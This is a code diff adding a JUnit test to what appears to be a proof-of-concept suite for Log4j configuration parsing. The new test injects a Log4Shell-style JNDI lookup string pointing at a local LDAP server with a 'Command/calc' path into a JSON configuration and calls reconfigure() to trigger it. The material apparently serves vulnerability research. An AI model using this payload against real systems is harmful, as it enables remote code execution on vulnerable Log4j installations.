@@ -8,6 +8,7 @@ import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
 import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
 import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
 import org.apache.logging.log4j.core.config.composite.CompositeConfiguration;
+import org.apache.logging.log4j.core.config.json.JsonConfiguration;
 import org.apache.logging.log4j.core.config.json.JsonConfigurationFactory;
 import org.apache.logging.log4j.core.config.yaml.YamlConfigurationFactory;
 import org.apache.logging.log4j.core.jmx.LoggerContextAdmin;
@@ -32,6 +33,16 @@ public class ConfigPocTests {
 
         JsonConfigurationFactory factory = new JsonConfigurationFactory();
         Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
+    }
+
+    @Test
+    public void reconfigureJSONConfigurationTest() throws IOException {
+        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        JsonConfiguration config = new JsonConfiguration(new LoggerContext("testContext"), source);
+        config.reconfigure();
     }
 
     @Test
